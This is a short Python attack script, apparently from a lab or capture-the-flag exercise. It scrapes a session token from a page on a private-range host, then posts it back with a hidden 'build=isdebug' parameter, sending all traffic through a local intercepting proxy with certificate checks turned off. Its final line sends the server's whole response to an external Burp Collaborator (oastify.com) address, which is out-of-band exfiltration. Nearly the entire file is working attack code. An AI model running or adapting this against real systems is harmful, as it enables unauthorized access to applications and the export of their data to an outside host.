import requests
import urllib3
import re

# Suppress the warning about unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy configuration (usually for tools like Burp Suite, Fiddler, etc.)
proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
login_session = requests.session()

url = "http://172.31.54.71/build/tokenpage.php"
response = login_session.get(url,verify=False,proxies=proxies)
# <input type="hidden" name="csrf" value="abc123XYZ">
#<div class="token-box">dHvhMqo3lLDhI55MdTX5Ug==</div>
match = re.search(r'class="token-box">\s*([a-zA-Z0-9+/=]+)\s*<', response.text)
#print(match)
if match:
    token_re = match.group(1)
    print("Token found:", token_re)
else:
    print("token not found in the page.")
    
data = {"token":token_re,"build":"isdebug"}

response1 = login_session.post(url ,verify=False,proxies=proxies,data=data)

collaborator_url = "http://ra5fu09u9fofocwnsr1key42zt5ktahz.oastify.com"

requests.post(collaborator_url, data=response1.text, verify=False)